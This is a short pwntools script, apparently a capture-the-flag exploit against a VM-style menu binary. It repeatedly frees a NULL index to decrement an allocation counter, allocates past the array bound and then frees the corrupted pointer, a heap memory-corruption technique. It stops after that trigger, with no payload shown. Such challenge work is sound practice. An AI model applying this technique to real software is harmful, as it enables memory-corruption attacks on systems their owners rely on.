from pwn import *

context.arch = 'amd64'
target = './0e73066d87ff433989805349cfddc758'

p = gdb.debug(target)
#p = process(target)

def read_vm_menu():
    return p.recvuntil(':')

def allocate_host_memory(size):
    read_vm_menu()
    p.send("4")
    read_vm_menu()
    p.send(p16(size))

def free_host_memory(index):
    read_vm_menu()
    p.send("6")
    read_vm_menu()
    p.send(p8(index))

for x in range(16):
    allocate_host_memory(0x200)

# decrement number_of_allocs by freeing NULL pointer
for x in range(4):
    free_host_memory(0)

# fill all the allocations to go beyond array index
allocate_host_memory(0x200)
allocate_host_memory(0x200)

# free the corrupted pointer
free_host_memory(0)
read_vm_menu()

